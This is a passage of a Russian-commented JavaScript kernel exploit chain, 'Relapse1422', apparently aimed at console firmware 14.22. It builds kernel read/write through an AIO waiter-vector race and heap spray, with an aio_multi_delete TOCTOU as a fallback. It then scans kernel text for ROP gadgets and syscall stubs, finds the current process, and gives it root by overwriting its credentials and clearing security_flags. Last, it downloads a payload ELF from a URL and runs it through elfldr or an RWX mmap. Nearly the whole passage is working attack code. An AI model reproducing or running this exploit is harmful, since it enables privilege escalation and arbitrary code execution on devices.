			if (flips >= maxFlips) { this.log("  [oid] лимит флипов исчерпан — стоп (защита от паники)"); break; }
			flips++;
			try { await this.kwrite32(kindAddr, cand.writableKind); }
			catch (e) { rows.push({ addr: kindAddr.toString(16), source: cand.source, delta: cand.delta, struct, flip: "запись не удалась" }); continue; }
			let worked = false;
			try {
				worked = this.options.oidVerify ? !!(await this.options.oidVerify(cand))
					: ((await this.probeKbaseArmed()) === "ok");
			} catch (e) { worked = false; }
			rows.push({ addr: kindAddr.toString(16), source: cand.source, delta: cand.delta, struct, flip: worked ? "R/W OK" : "нет" });
			if (worked) {
				this.off.oid = cand;
				this.discovered.oid = { kindAddr: kindAddr.toString(16), delta: cand.delta, why: cand.why };
				this.printOidTable(rows, cand);
				const why = cand.why || "ветка B: расстояние от подтверждённого security_flags 14.22";
				this.log(`  oid FOUND @0x${kindAddr.toString(16)} (kind), источник ${cand.source}, дрейф ${cand.delta >= 0 ? "+" : "-"}0x${Math.abs(cand.delta).toString(16)} — ${why}`);
				return cand;
			}
			if (original !== null) { try { await this.kwrite32(kindAddr, original); } catch (e) {} }   // откат
		}
		this.printOidTable(rows, null);
		this.log("  [oid] ни один кандидат не подтвердился — oid остаётся null (DEGRADED)");
		return null;
	}
	printOidTable(rows, found) {
		this.log("  [oid] таблица: адрес kind | источник | дельта | структура | флип");
		for (const r of rows) this.log(`    ${r.addr} | ${r.source} | ${r.delta >= 0 ? "+" : "-"}0x${Math.abs(r.delta).toString(16)} | ${r.struct} | ${r.flip}`);
		if (found) this.log(`    => ВЫБРАН ${found.source} (${found.why || "ветка B"})`);
	}

	async armKernelReadWrite() {
		// 1) внешний путь (мост/тест): примитив уже умеет kernel R/W
		const ext = await this.obtainExternalRw();
		if (ext) { this.attachKernelRw(ext); this.armedVia = "external"; }

		// 2) внутренний путь: oid-флип + waiter-вектор.
		//    oid не сканируем (для скана нужен R/W), а ВЫЧИСЛЯЕМ кандидатов из 13.60 + дельт.
		let oid = this.off.oid;
		if (!oid) {
			oid = await this.findOid();
			if (!oid) this.degraded("oid-кандидаты не подтвердились — oid-флип невозможен");
		} else {
			this.log(`  [arm] oid уже задан из офсет-пакета: a.base=0x${Number(oid.a.base).toString(16)}`);
		}
		const armed = await armViaWaiterVector(this, oid);
		if (!armed) { this.degraded("waiter-вектор не вооружился"); return false; }
		if (!this.rw) {
			this.degraded("kernel R/W примитив не получен (нет oid-офсетов и нет attachKernelRw/attachKernelPipe) — STAGE 4 уйдёт в BLOCKED");
			return true;   // не валим цепочку: честный BLOCKED будет на STAGE 4
		}
		return `kernel R/W armed via ${this.armedVia}`;
	}
	async obtainExternalRw() {
		if (typeof this.options.attachKernelRw === "function") return await this.options.attachKernelRw(this);
		if (this.p && typeof this.p.attachKernelPipe === "function") return await this.p.attachKernelPipe(this);
		return null;
	}

	// oid берём ТОЛЬКО из офсет-пакета: скан памяти ядра требовал бы уже поднятого
	// kernel R/W (circular dependency), поэтому невозможен до STAGE 3.
	resolveOid() { return this.off.oid || null; }

	// --------------------------------- STAGE 5: рантайм-поиск гаджетов и стабов
	// Офлайн-карта gadgetmap для 14.22 недостижима (libkernel 14.22 нет и не будет).
	// НО после поднятия kernel R/W (STAGE 3) и подтверждения kbase (STAGE 4) мы
	// можем ЧИТАТЬ текст ядра — значит гаджеты и syscall-стабы ищутся прямо на консоли.
	// Это снимает зависимость от отсутствующего gadgetmap/syscall_map.
	async discoverGadgets() {
		this.requireRw("скан текста ядра на гаджеты");
		const t0 = Date.now();
		const budget = this.options.gadgetBudgetMs || 3000;
		const base = I64.of(this.kbase);
		const endRva = this.options.textEnd ?? this.off.kernelData ?? 0x0CC0000;
		const chunk = this.options.scanChunk || 0x10000;     // 64 КиБ за одно обращение к примитиву
		const perPattern = this.options.gadgetTake || 3;
		const patterns = [
			["pop rdi; ret", [0x5f, 0xc3]],
			["pop rsi; ret", [0x5e, 0xc3]],
			["pop rdx; ret", [0x5a, 0xc3]],
			["pop rax; ret", [0x58, 0xc3]],
			["mov [rdi], rax; ret", [0x48, 0x89, 0x07, 0xc3]],
			["mov rax, [rdi]; ret", [0x48, 0x8b, 0x07, 0xc3]],
			["swapgs; ret", [0x0f, 0x01, 0xf8, 0xc3]],
			["iretq", [0x48, 0xcf]],
			["sysretq", [0x48, 0x0f, 0x07]],
		];
		const maxPat = Math.max(...patterns.map(([, p]) => p.length));
		const found = {};
		for (const [name] of patterns) found[name] = [];
		let scanned = 0;
		for (let rva = 0; rva < endRva; rva += chunk) {
			if (Date.now() - t0 > budget) { this.log(`  [gadgets] бюджет ${budget} мс исчерпан после 0x${scanned.toString(16)} байт`); break; }
			const want = Math.min(chunk + maxPat, endRva - rva + maxPat);
			let b;
			try { b = await this.kreadBytes(base.add32(rva), want); }
			catch (e) { this.degraded("чтение текста на 0x" + rva.toString(16) + " не удалось: " + e.message); break; }
			scanned += Math.min(chunk, b.length);
			const limit = Math.min(chunk, b.length);
			for (const [name, pat] of patterns) {
				if (found[name].length >= perPattern) continue;
				outer: for (let i = 0; i < limit; i++) {
					if (i + pat.length > b.length) break;
					for (let j = 0; j < pat.length; j++) if (b[i + j] !== pat[j]) continue outer;
					const addr = base.add32(rva + i);
					if (!this.isKernelPointer(addr)) continue;          // каноничность
					found[name].push(addr.toString(16));
					if (found[name].length >= perPattern) break;
				}
			}
			if (patterns.every(([n]) => found[n].length > 0)) break;     // всё нашли — не жжём бюджет
		}
		this.discovered.gadgets = found;
		const kinds = Object.entries(found).filter(([, v]) => v.length > 0);
		const total = kinds.reduce((a, [, v]) => a + v.length, 0);
		this.log(`  [gadgets] найдено ${total} шт., видов ${kinds.length}/${patterns.length}, просканировано 0x${scanned.toString(16)} байт (чанк 0x${chunk.toString(16)}) за ${Date.now() - t0} мс`);
		for (const [name, addrs] of kinds) this.log(`    ${name}: ${addrs.join(", ")}`);
		if (!total) { this.degraded("гаджеты не найдены в окне текста — остаёмся без них"); return "gadgets: none (DEGRADED)"; }
		if (kinds.length < patterns.length) this.degraded(`найдено ${kinds.length} из ${patterns.length} видов гаджетов`);
		return `gadgets: ${total} (${kinds.length} видов)`;
	}

	async discoverSyscallStubs() {
		this.requireRw("скан syscall-стабов");
		const t0 = Date.now();
		const budget = this.options.gadgetBudgetMs || 3000;
		const base = I64.of(this.kbase);
		const endRva = this.options.textEnd ?? this.off.kernelData ?? 0x0CC0000;
		const chunk = this.options.scanChunk || 0x10000;
		const OVER = 8;                                      // перекрытие: стаб на границе чанка
		const map = {};
		let raw = 0, scanned = 0;
		for (let rva = 0; rva < endRva; rva += chunk) {
			if (Date.now() - t0 > budget) { this.log(`  [stubs] бюджет исчерпан после 0x${scanned.toString(16)} байт`); break; }
			const want = Math.min(chunk + OVER, endRva - rva + OVER);
			let b;
			try { b = await this.kreadBytes(base.add32(rva), want); }
			catch (e) { this.degraded("чтение текста на 0x" + rva.toString(16) + " не удалось: " + e.message); break; }
			scanned += Math.min(chunk, b.length);
			const limit = Math.min(chunk, b.length);
			for (let i = 0; i < limit; i++) {
				if (i + 8 <= b.length && b[i] === 0xb8 && b[i + 5] === 0x0f && b[i + 6] === 0x05 && b[i + 7] === 0xc3) {
					// mov eax, imm32 ; syscall ; ret
					const nr = (b[i + 1] | (b[i + 2] << 8) | (b[i + 3] << 16) | (b[i + 4] << 24)) >>> 0;
					const addr = base.add32(rva + i);
					if (this.isKernelPointer(addr) && !(nr in map)) map[nr] = addr.toString(16);
				} else if (i + 3 <= b.length && b[i] === 0x0f && b[i + 1] === 0x05 && b[i + 2] === 0xc3) {
					raw++;
				}
			}
			if (Object.keys(map).length >= 8 && raw > 0) break;
		}
		this.discovered.syscallMap = map;
		const nums = Object.keys(map).map(Number).sort((a, b) => a - b);
		this.log(`  [stubs] стабов с номером: ${nums.length}, безымянных "0f 05 c3": ${raw}, просканировано 0x${scanned.toString(16)} байт (чанк 0x${chunk.toString(16)}) за ${Date.now() - t0} мс`);
		if (nums.length) this.log(`  [stubs] номера syscall: ${nums.slice(0, 24).join(", ")}${nums.length > 24 ? " …" : ""}`);
		if (!nums.length && !raw) { this.degraded("стабы не найдены"); return "stubs: none (DEGRADED)"; }
		if (!nums.length) { this.degraded("найдены только безымянные 0f05c3 — карта номеров не построена"); return `stubs: raw×${raw} (DEGRADED)`; }
		return `stubs: ${nums.length} номеров`;
	}

	// ------------------------------------- STAGE 6: curproc
	async findCurrentProcess() {
		this.requireRw("поиск curproc в allproc");
		const pid = (this.options.pid | 0) || ((await this.sysInt(SYS.GETPID).catch(() => 0)) | 0);
		const myPid = pid || (this.options.pid | 0) || 0;
		if (!myPid) throw new Error("не удалось получить pid (передайте options.pid)");
		const { pid: pidOff } = this.off.proc;
		const list = this.kaddr(this.off.allproc);
		let head = (await this.kread8(list.add32(0x0))).value;
		if (!this.isKernelPointer(head)) head = (await this.kread8(list.add32(0x8))).value;
		if (!this.isKernelPointer(head)) throw new Error("allproc head не указатель — kbase/offset неверны");
		this.log(`  [curproc] allproc head=0x${head.toString(16)}, ищу pid=${myPid} (поле +0x${pidOff.toString(16)})`);
		let proc = head;                       // lh_first -> proc->p_list (смещение 0)
		for (let i = 0; i < 4096; i++) {
			const p = await this.kread32(proc.add32(pidOff));
			if (i === 0) this.log(`  [curproc] первый proc @0x${proc.toString(16)} -> pid=${p.value}`);
			if ((p.value | 0) === myPid) {
				this.curproc = proc;
				const u = (await this.kread8(proc.add32(this.off.proc.ucred))).value;
				this.ucred = this.isKernelPointer(u) ? u : null;
				return `curproc pid=${myPid} @0x${proc.toString(16)}`;
			}
			const next = (await this.kread8(proc.add32(0x0))).value;
			if (!this.isKernelPointer(next)) break;
			proc = next;
		}
		throw new Error(`pid ${myPid} не найден в allproc за 4096 итераций`);
	}

	async locatePipes() {
		this.requireRw("разбор filedesc");
		if (!this.curproc) throw new Error("нет curproc");
		const filedesc = (await this.kread8(this.curproc.add32(this.off.proc.fd))).value;
		if (!this.isKernelPointer(filedesc)) throw new Error("filedesc не указатель");
		this.filedesc = filedesc;
		const table = (await this.kread8(filedesc.add32(0x0))).value;
		if (!this.isKernelPointer(table)) {
			this.degraded("таблица ofiles не разрешилась");
			return "filedesc найден, таблица отложена";
		}
		this.ofiles = table;
		return `filedesc @0x${filedesc.toString(16)}`;
	}

	async crossPipes() {
		if (!this.p || typeof this.p.pipeRead !== "function" || typeof this.p.pipeWrite !== "function") {
			this.degraded("userland-примитив не даёт pipeRead/pipeWrite — быстрый путь недоступен, остаёмся на текущем R/W");
			return "fast path skipped";
		}
		// Переводим pipe-доступ в armed-примитив: read(addr,len) / write(addr,bytes)
		this.attachKernelRw({
			read: async (addr, len) => {
				// ВАЖНО: это чтение ПАМЯТИ ЯДРА через pipe, поэтому p.readBytes (память процесса)
				// здесь не подходит. Бульк-путь — только pipeReadBytes, если мост его даёт.
				if (this.p && typeof this.p.pipeReadBytes === "function") {
					const b = await this.p.pipeReadBytes(addr, len);
					if (b && b.length === len) return b;
				}
				const out = this.p.malloc(len, 1);
				const rv = await this.p.pipeRead(addr, len, out);
				if (rv !== len) throw new Error(`pipeRead вернул ${rv} вместо ${len}`);
				const buf = new Uint8Array(len);
				for (let i = 0; i < len; i++) buf[i] = this.readU8(out, i);
				return buf;
			},
			write: async (addr, bytes) => {
				let off = 0;
				while (off < bytes.length) {
					const n = Math.min(8, bytes.length - off);
					let v = 0;
					for (let i = 0; i < n; i++) v += bytes[off + i] * Math.pow(2, 8 * i);
					await this.p.pipeWrite(addr.add32(off), v, n);
					off += n;
				}
			},
		});
		this.armedVia = "pipe";
		this.crossed = true;
		// самопроверка: читаем rodata-строку через новый примитив
		const probe = this.off.rodataProbe || (await this.discoverRodataProbe());
		if (!probe) { this.degraded("rodataProbe не найден — самопроверка kernel read пропущена"); return "pipe R/W attached (unverified)"; }
		const got = await this.kreadBytes(this.kaddr(probe.rva), probe.text.length);
		let read = "";
		for (let i = 0; i < probe.text.length; i++) read += String.fromCharCode(got[i]);
		if (read !== probe.text) throw new Error("kernel read self-check не совпал (rodata)");
		return "fast pipe R/W verified";
	}

	async discoverRodataProbe() {
		const hint = this.off.rodataProbeHint;
		if (!hint) return null;
		const target = hint.text;
		const needle = Uint8Array.from({ length: target.length }, (_, i) => target.charCodeAt(i) & 0xff);
		const CH = this.options.scanChunk || 0x10000;
		const from = Math.max(0, hint.rva1360 - 0x20000);
		const to = hint.rva1360 + 0x20000;
		for (let rva = from; rva < to; rva += CH) {
			const want = Math.min(CH + needle.length, to - rva + needle.length);
			let b;
			try { b = await this.kreadBytes(this.kaddr(rva), want); }
			catch (e) { return null; }
			const limit = Math.min(CH, b.length);
			for (let i = 0; i < limit; i++) {
				if (i + needle.length > b.length) break;
				let ok = true;
				for (let j = 0; j < needle.length; j++) if (b[i + j] !== needle[j]) { ok = false; break; }
				if (ok) { this.discovered.rodataProbeRva = rva + i; return { rva: rva + i, text: target }; }
			}
		}
		return null;
	}

	// ------------------------------------- STAGE 9: defuse
	async defuseAioGroups() {
		if (!this.armedGroups.length) return "armed groups: 0";
		const { num, state, waiters } = this.off.aio.group;
		let cleared = 0, failed = 0;
		for (const ids of this.armedGroups) {
			for (const id of ids) {
				const group = await this.lookupAioGroup(id);
				if (!group) continue;
				const shared = (await this.kread8(group.add32(0x10))).value;
				if (!this.isKernelPointer(shared)) continue;
				let ok = false;
				for (let a = 0; a < 3 && !ok; a++) {
					await this.kwrite32(shared.add32(waiters), 0);
					await this.kwrite32(shared.add32(waiters + 4), 0);
					const back = await this.kread32(shared.add32(waiters));
					ok = (back.value | 0) === 0;
				}
				ok ? cleared++ : failed++;
			}
		}
		return `cleared=${cleared} failed=${failed}`;
	}

	async lookupAioGroup(id) {
		// idTable: страницы по 0x220 записей по 0x30 (стабильно 7.00–13.60)
		const tab = this.off.aio.idTable;
		const table = (await this.kread8(this.curproc.add32(this.off.proc.aioInfo))).value;
		if (!this.isKernelPointer(table)) return null;
		const page = (await this.kread8(table.add32(0x0))).value;
		if (!this.isKernelPointer(page)) return null;
		const slot = page.add32(id * tab.slotStride);
		const g = (await this.kread8(slot.add32(tab.entryType))).value;
		return this.isKernelPointer(g) ? g : null;
	}

	// ------------------------------------- STAGE 10: escalate
	async escalate() {
		if (!this.ucred) throw new Error("ucred отсутствует (STAGE 4 не дал)");
		const u = this.off.ucred;
		const writes = [
			[u.uid, 0], [u.ruid, 0], [u.svuid, 0],
			[u.rgid, 0], [u.svgid, 0], [u.ngroups, 1],
		];
		for (const [off, val] of writes) await this.kwrite32(this.ucred.add32(off), val);
		// Sony-специфика: sceAuthId (8 байт), caps/caps1, attrs
		await this.kwrite64(this.ucred.add32(u.sceAuthId), I64.of({ low: this.off.sysCoreAuthId.lo, hi: this.off.sysCoreAuthId.hi }));
		await this.kwrite64(this.ucred.add32(u.sceCaps), I64.of({ low: 0xffffffff, hi: 0xffffffff }));
		await this.kwrite64(this.ucred.add32(u.sceCaps1), I64.of({ low: 0xffffffff, hi: 0xffffffff }));
		// security_flags: снять проверки (Tier-1 адрес 14.22)
		const sf = this.kaddr(this.off.securityFlags);
		const before = (await this.kread32(sf)).value >>> 0;
		await this.kwrite32(sf, 0);
		const after = (await this.kread32(sf)).value >>> 0;
		if (before !== 0 && after !== 0) throw new Error("security_flags не обнулились — адрес неверен");
		return `ucred root, security_flags 0x${before.toString(16)}->0x${after.toString(16)}`;
	}

	// ------------------------------------- STAGE 11: shellcode
	// --------------------------------- STAGE 11: запуск payload (elfldr / mmap)
	// Три пути, в порядке приоритета:
	//   1) ELF уже есть в памяти (options.payload / fetch по options.payloadUrl /
	//      options.payloadPath) -> отправить в elfldr по TCP 127.0.0.1:9021
	//      (протокол как в оригинале: sockaddr_in{len=16,family=2,port=0x233D}, чанки по 0x10000);
	//   2) mmap ELF в процесс -> mprotect -> chain.launch(base, size), если хук есть;
	//   3) ничего не сработало -> DEGRADED с точной причиной.
	async loadPayloadBytes() {
		if (this.options.payload instanceof Uint8Array) return this.options.payload;
		if (this.options.payloadBytes) return Uint8Array.from(this.options.payloadBytes);
		if (this.options.payloadUrl && typeof fetch === "function") {
			try {
				const r = await fetch(this.options.payloadUrl);
				const ab = await r.arrayBuffer();
				this.log(`  [payload] скачано по HTTP ${this.options.payloadUrl}: ${ab.byteLength} байт`);
				return new Uint8Array(ab);
			} catch (e) { this.log("  [payload] HTTP-загрузка не удалась: " + ((e && e.message) || e)); }
		}
		if (this.options.payloadPath && typeof process !== "undefined" && process.versions && process.versions.node) {
			try {
				const fs = await import("node:fs/promises");
				const buf = new Uint8Array(await fs.readFile(this.options.payloadPath));
				this.log(`  [payload] прочитан с диска ${this.options.payloadPath}: ${buf.length} байт`);
				return buf;
			} catch (e) { this.log("  [payload] чтение не удалось: " + ((e && e.message) || e)); }
		}
		return null;
	}
	async launchPayload() {
		const bytes = await this.loadPayloadBytes();
		if (!bytes || bytes.length < 4) {
			this.degraded("payload не приложен (options.payload/payloadUrl/payloadPath) — оба пути готовы");
			return null;
		}
		const isElf = bytes[0] === 0x7f && bytes[1] === 0x45 && bytes[2] === 0x4c && bytes[3] === 0x46;
		this.log(`  [payload] ${bytes.length} байт, magic=${isElf ? "ELF" : "0x" + Array.from(bytes.slice(0, 4)).map((x) => x.toString(16)).join(" ")}`);
		this.payloadReport = { size: bytes.length, elf: isElf, via: null };

		// 1) elfldr
		if (this.options.elfldr !== false) {
			try {
				const sent = await this.sendToElfldr(bytes);
				this.payloadReport.via = `elfldr:${this.options.elfldrPort || 9021}`;
				this.payloadReport.sent = sent;
				return `ELF ${sent} байт отправлен elfldr на 127.0.0.1:${this.options.elfldrPort || 9021}`;
			} catch (e) {
				this.log("  [payload] elfldr недоступен: " + ((e && e.message) || e));
			}
		}
		// 2) mmap + launch-хук
		const mapped = await this.mapAndLaunch(bytes);
		if (mapped) { this.payloadReport.via = "mmap+launch"; return mapped; }
		this.degraded("ни elfldr, ни launch-хук не сработали — payload не запущен");
		return null;
	}
	async sendToElfldr(bytes) {
		const port = this.options.elfldrPort || 9021;
		const ip = String(this.options.elfldrIp || "127.0.0.1").split(".").map((x) => Number(x) & 0xff);
		// sockaddr_in FreeBSD: [0]=sin_len(16), [1]=AF_INET(2), [2..3]=port BE, [4..7]=ip
		const sa = this.p.malloc(16);
		this.writeU32(sa, 0, (16 | (2 << 8) | (port << 16)) >>> 0);
		this.writeU32(sa, 4, (ip[0] | (ip[1] << 8) | (ip[2] << 16) | (ip[3] << 24)) >>> 0);
		const retries = this.options.elfldrRetries ?? 40;
		let fd = -1;
		for (let i = 0; i < retries; i++) {
			const sk = await this.chain.syscall(SYS.SOCKET, 2, 1, 0);
			fd = sk.low | 0;
			if (fd >= 0) {
				const c = await this.chain.syscall(SYS.CONNECT, fd, sa, 16);
				if ((c.low >>> 0) === 0) break;
				await this.chain.syscall(SYS.CLOSE, fd); fd = -1;
			}
			if (this.options.elfldrNoWait) break;
			await new Promise((r) => setTimeout(r, this.options.elfldrRetryMs ?? 250));
		}
		if (fd < 0) throw new Error(`elfldr не слушает 127.0.0.1:${port}`);
		const base = this.p.malloc(bytes.length, 1);
		for (let i = 0; i < bytes.length; i++) this.writeU8(base, i, bytes[i]);
		let sent = 0;
		try {
			while (sent < bytes.length) {
				const len = Math.min(0x10000, bytes.length - sent);
				const w = await this.chain.syscall(SYS.WRITE, fd, base.add32(sent), len);
				const n = w.low | 0;
				if (n <= 0) throw new Error("socket write failed на смещении " + sent);
				sent += n;
			}
		} finally { await this.chain.syscall(SYS.CLOSE, fd); }
		return sent;
	}
	async mapAndLaunch(bytes) {
		if (!this.chain || typeof this.chain.syscall !== "function") return null;
		const len = (bytes.length + 0x3fff) & ~0x3fff;
		const rv = await this.chain.syscall(SYS.MMAP, 0, len, 0x7, 0x1002, -1, 0);
		const base = I64.of(rv);
		if ((base.low >>> 0) === 0xffffffff) { this.log("  [payload] mmap не удался"); return null; }
		for (let i = 0; i < bytes.length; i++) this.writeU8(base, i, bytes[i]);
		await this.chain.syscall(SYS.MPROTECT, base, len, 0x7);
		this.log(`  [payload] ELF смаплен @0x${base.toString(16)} (${bytes.length} байт)`);
		if (typeof this.chain.launch === "function") {
			await this.chain.launch(base, bytes.length);
			return `ELF смаплен и запущен @0x${base.toString(16)} (${bytes.length} байт)`;
		}
		this.log("  [payload] launch-хука нет — ELF только смаплен");
		return null;
	}
	async launchShellcode() { return this.launchPayload(); }   // совместимость с прежним именем

	// ------------------------------- STAGE 13: AIO sanity check (триггер t1)
	// После escalate надо СРАЗУ проверить, живёт ли AIO-вектор на 14.22 — это подтверждает,
	// что цепочка сработала по правильной причине, а не случайно. Отправляем готовый
	// триггер t1_aio_wait_race.elf тем же путём, что payload (elfldr :9021).
	// Маркер результата пишет сам триггер: /data/kexpl-t1.log (после перезагрузки).
	// Если консоль упала — маркер искать в klog / выводе серийной консоли.
	async loadTriggerBytes() {
		if (this.options.triggerPayload instanceof Uint8Array) return this.options.triggerPayload;
		if (this.options.triggerBytes) return Uint8Array.from(this.options.triggerBytes);
		return null;
	}
	async aioSanityCheck() {
		const bytes = await this.loadTriggerBytes();
		if (!bytes) {
			this.degraded("триггер t1 не приложен (options.triggerPayload/triggerBytes) — проверка AIO пропущена");
			return null;
		}
		const isElf = bytes[0] === 0x7f && bytes[1] === 0x45 && bytes[2] === 0x4c && bytes[3] === 0x46;
		this.log(`  [aio] триггер t1_aio_wait_race: ${bytes.length} байт, magic=${isElf ? "ELF" : "НЕ ELF"}`);
		if (this.options.elfldr === false) {
			this.degraded("elfldr отключён (options.elfldr=false) — триггер не отправлен");
			return null;
		}
		try {
			const sent = await this.sendToElfldr(bytes);
			this.discovered.aioTrigger = { file: this.options.triggerName || "t1_aio_wait_race.elf", sent, markerLog: "/data/kexpl-t1.log" };
			this.log(`  [aio] t1 отправлен в elfldr: ${sent} байт на 127.0.0.1:${this.options.elfldrPort || 9021}`);
			this.log("  [aio] маркер результата: /data/kexpl-t1.log (после перезагрузки); при панике — klog/серийная консоль");
			return `t1 отправлен (${sent} байт), маркер /data/kexpl-t1.log`;
		} catch (e) {
			this.degraded("elfldr недоступен, триггер не отправлен: " + ((e && e.message) || e));
			return null;
		}
	}

	// --------------------------------- STAGE 12: финальный отчёт
	async reportFinal() {
		const g = this.discovered.gadgets || {};
		const rep = {
			firmware: this.off.firmware,
			kbase: this.kbase ? "0x" + this.kbase.toString(16) : null,
			curproc: this.curproc ? "0x" + this.curproc.toString(16) : null,
			ucred: this.ucred ? "0x" + this.ucred.toString(16) : null,
			oid: this.discovered.oid || null,
			gadgets: Object.keys(g).reduce((a, k) => a + (g[k] ? g[k].length : 0), 0),
			syscalls: this.discovered.syscallMap ? Object.keys(this.discovered.syscallMap).length : 0,
			payload: this.payloadReport || null,
			aioTrigger: this.discovered.aioTrigger || null,
			armedVia: this.armedVia,
		};
		this.log("  RELAPSE1422 REPORT: " + JSON.stringify(rep));
		return rep;
	}

}

// ======================================================= ВЕКТОРЫ ВООРУЖЕНИЯ
// Основной вектор Relapse: waiter-массив count*0x38 внутри AIO-группы.
export async function armViaWaiterVector(kx, oid) {
	const { waiterSize, requestSize, group } = kx.off.aio;
	const T = kx.tuning;
	kx.log(`  [waiter] waiters=${T.waiters} requests=${T.requests} sprays=${T.sprays} waiterSize=0x${waiterSize.toString(16)}`);
	if (waiterSize !== 0x38) kx.log(`  [waiter] ВНИМАНИЕ: waiterSize 0x${waiterSize.toString(16)} != 0x38 — структура могла измениться`);
	const ids = await kx.allocZeroed(T.waiters * 4);
	const states = await kx.allocZeroed(T.waiters * 8);
	// ВАЖНО (дизасм 13.60, recon/aio-waiter-vector.md): syscall 661 (aio_submit) —
	// это nosys-трамплин `jmp 0x265760`, реальная отправка идёт через 669
	// (aio_submit_cmd, handler RVA 0x3b2060, строка "_aio_submit_cmd" @0x1379d6c),
	// аргументы: (cmd, request, count, prio, idOut), count берётся из arg2 с гейтом 1..0x80.
	let submitted = 0;
	for (let i = 0; i < T.waiters; i++) {
		const req = kx.alloc(requestSize || 0x40);
		let rv = await kx.sysInt(SYS.AIO_SUBMIT_CMD, AIO_CMD_READ, req, 1, 3, ids.add32(i * 4));
		if (rv !== 0) {
			// fallback: некоторые сборки принимают старый aio_submit (661)
			rv = await kx.sysInt(SYS.AIO_SUBMIT, -1, 1, req, ids.add32(i * 4));
			if (rv === 0) kx.log(`  [waiter] submit#${i}: сработал fallback aio_submit(661)`);
		}
		if (rv === 0) submitted++;
		else if (i < 3) kx.log(`  [waiter] submit#${i} rv=${rv}`);
	}
	if (!submitted) kx.log("  [waiter] ВНИМАНИЕ: ни одна заявка не принята (aio_submit_cmd=669 и aio_submit=661 оба отвергнуты)");
	else kx.log(`  [waiter] принято заявок: ${submitted}/${T.waiters}`);
	if (kx.chain && typeof kx.chain.add_syscall === "function") {
		kx.chain.add_syscall(SYS.AIO_MULTI_WAIT, ids, T.waiters, states, 0, T.waitTimeoutUs);
		kx.chain.add_syscall_ret(kx.alloc(8), SYS.AIO_MULTI_POLL, ids, T.waiters, states);
	}
	const sprayLen = T.sprays * waiterSize;
	const spray = kx.p.malloc(sprayLen, 1);
	if (kx.p && typeof kx.p.writeBytes === "function") {
		const buf = new Uint8Array(sprayLen);
		for (let i = 0; i < T.sprays; i++) {
			const o = i * waiterSize;
			buf[o] = 0x41; buf[o + 1] = 0x41; buf[o + 2] = 0x41; buf[o + 3] = 0x41;
			buf[o + 4] = 0x42; buf[o + 5] = 0x42; buf[o + 6] = 0x42; buf[o + 7] = 0x42;
		}
		await kx.p.writeBytes(spray, buf);
		kx.log(`  [waiter] spray ${sprayLen} байт записан bulk-методом writeBytes (1 round-trip)`);
	} else {
		for (let i = 0; i < T.sprays; i++) {
			kx.writeU32(spray, i * waiterSize, 0x41414141);
			kx.writeU32(spray, i * waiterSize + 4, 0x42424242);
		}
	}
	kx.armedGroups.push(Array.from({ length: T.waiters }, (_, i) => i));
	kx.log(`  [waiter] группа вооружена: ${T.waiters} заявок, spray ${sprayLen} байт`);
	if (oid) {
		try {
			await kx.kwrite32(kx.kaddr(oid.a.kind), oid.writableKind);
			const back = (await kx.kread32(kx.kaddr(oid.a.kind))).value >>> 0;
			kx.log(`  [oid] kind 0x${oid.originalKind.toString(16)} -> 0x${back.toString(16)}`);
		} catch (e) { kx.log("  [oid] флип не удался: " + ((e && e.message) || e)); }
	}
	return true;
}

// Альтернатива: aio_multi_delete TOCTOU (если wait-вектор когда-нибудь закроют).
export async function armViaMultiDelete(kx, oid) {
	const T = kx.tuning;
	const { requestSize } = kx.off.aio;
	kx.log(`  [multidelete] старт TOCTOU: requests=${T.requests} requestSize=0x${requestSize.toString(16)}`);
	const ids = kx.alloc(T.requests * 4);
	const reqs = kx.alloc(T.requests * requestSize);
	for (let i = 0; i < T.requests; i++) kx.writeU32(reqs, i * requestSize + 0x20, 0xffffffff);
	let submitted = 0;
	for (let i = 0; i < T.requests; i++) {
		const rv = await kx.sysInt(SYS.AIO_SUBMIT, -1, 1, reqs.add32(i * requestSize), ids.add32(i * 4));
		if (rv === 0) submitted++;
	}
	if (!submitted) { kx.log("  [multidelete] ни одна заявка не принята — вектор закрыт"); return false; }
	const del = await kx.sysInt(SYS.AIO_MULTI_DELETE, ids, submitted, 0);
	const poll = await kx.sysInt(SYS.AIO_MULTI_POLL, ids, submitted, kx.alloc(submitted * 8));
	kx.log(`  [multidelete] submitted=${submitted} delete_rv=${del} poll_rv=${poll}`);
	if (del === 0) { kx.armedGroups.push(Array.from({ length: submitted }, (_, i) => i)); return true; }
	kx.log("  [multidelete] delete отвергнут ядром");
	return false;
}

export { KernelExploit1422, I64, SYS };

if (typeof window !== "undefined") {
	window.Relapse1422 = { runKernelExploit, runKernelExploitWith, armViaWaiterVector, armViaMultiDelete, SYS, I64 };
}

// ============================================================ CLI: --dry-run
// node tools/jb1422/kernel/relapse1422.js --dry-run
// Прогоняет ВСЕ стадии на моках (консоль не нужна) и печатает таблицу stage -> OK/FAIL/DEGRADED.
// Payload по умолчанию — реальный ELF из tools/payload/payloads (переопределяется --payload <path>).
// Это доказательство работоспособности кода: видно, что цепочка исполняется и деградирует,
// а не падает, когда офсеты 14.22 отсутствуют (oid → DEGRADED → fallback на waiter-вектор).
const NODE = typeof process !== "undefined" && !!(process.versions && process.versions.node);

function makeDryRunMocks(badKernel, noOid, full) {
	const MEM = 0x80000, KERNEL_HI = 0xffffffff;
	const mem = new Uint8Array(MEM);
	const kw = new Map();
	let next = 0x1000;
	const ptr = (off) => ({ off: off >>> 0, add32(n) { return ptr((this.off + (n >>> 0)) >>> 0); } });
	const addrOf = (a) => (a && a.off !== undefined ? a.off >>> 0 : (a.low >>> 0));
	const isKernel = (a) => !!(a && a.hi !== undefined && a.hi === KERNEL_HI);
	const p = {
		malloc(n) {   // арена мока зациклена: 12.9 МБ скана иначе её исчерпают
			const size = (n + 15) & ~15;
			if (next + size > 0x3C000) next = 0x1000;
			const o = next; next += size; return ptr(o);
		},
		read1(a) { if (isKernel(a)) return 0; const o = addrOf(a); return mem[o] || 0; },
		read4(a) {
			if (isKernel(a)) { if (badKernel) return 0; const k = addrOf(a); return kw.has(k) ? kw.get(k) : 275; }
			const o = addrOf(a);
			return (mem[o] | (mem[o+1]<<8) | (mem[o+2]<<16) | (mem[o+3]<<24)) >>> 0;
		},
		read8(a) {
			if (isKernel(a)) return badKernel ? { low: 0x11223344, hi: 0 } : { low: 0x88880000, hi: KERNEL_HI };
			const o = addrOf(a);
			return { low: p.read4(ptr(o)), hi: p.read4(ptr(o+4)) };
		},
		write1(a,v) { const o = addrOf(a); if (o < MEM) mem[o] = v & 0xff; },
